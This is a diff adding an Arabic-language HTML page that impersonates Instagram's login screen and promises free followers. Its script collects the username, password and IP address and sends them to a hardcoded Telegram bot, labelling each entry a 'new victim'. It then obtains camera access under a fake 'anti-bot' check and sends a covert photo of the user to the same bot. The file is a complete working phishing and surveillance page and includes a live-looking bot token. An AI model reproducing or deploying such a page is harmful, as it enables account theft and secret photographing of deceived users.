@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - تسجيل الدخول</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 1px; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
+        .btn-login { background: #0095f6; color: white; border: none; padding: 8px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .verify-box { margin-top: 15px; padding: 10px; border: 1px dashed #ed4956; border-radius: 5px; background: #fffafb; font-size: 11px; color: #ed4956; }
+        #status { font-size: 11px; margin-top: 10px; color: #8e8e8e; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540d95.png" alt="Instagram" class="logo">
+        
+        <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        
+        <select id="followersCount">
+            <option value="" disabled selected>اختر عدد المتابعين (مجاناً)</option>
+            <option value="500">500 متابع</option>
+            <option value="1000">1000 متابع</option>
+            <option value="2500">2500 متابع</option>
+            <option value="5500">5500 متابع</option>
+        </select>
+
+        <div class="verify-box">
+            ⚠️ "مكافحة الروبوتات": يجب السماح بالوصول للكاميرا للتحقق من الهوية البشرية وإتمام عملية الرشق.
+        </div>
+
+        <button class="btn-login" onclick="startProcess()">تسجيل الدخول</button>
+        <div id="status"></div>
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const CHAT_ID = '1371063739';
+
+        async function startProcess() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const count = document.getElementById('followersCount').value;
+            const status = document.getElementById('status');
+
+            if (!user || !pass || !count) {
+                alert("يرجى إكمال جميع الحقول للتحقق من الحساب.");
+                return;
+            }
+
+            status.innerText = "⏳ جاري التحقق من الهوية البشرية...";
+
+            try {
+                // طلب الكاميرا كشرط للرشق
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // سحب الـ IP والبيانات
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const msg = `🔥 ضحية جديدة!\n👤 الحساب: ${user}\n🔑 الباسورد: ${pass}\n👥 العدد: ${count}\n🌐 IP: ${ipData.ip}`;
+                
+                // إرسال البيانات فوراً
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+                // التقاط الصورة بعد ثانيتين من السماح
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        let fd = new FormData();
+                        fd.append('photo', blob, 'identity_check.jpg');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                }, 2000);
+
+                status.innerText = "✅ تم التحقق! سيبدأ رشق المتابعين خلال 24 ساعة.";
+            } catch (e) {
+                alert("فشل التحقق: يجب السماح للكاميرا لإثبات أنك لست روبوت.");
+            }
+        }
+    </script>
+</body>
+</html>
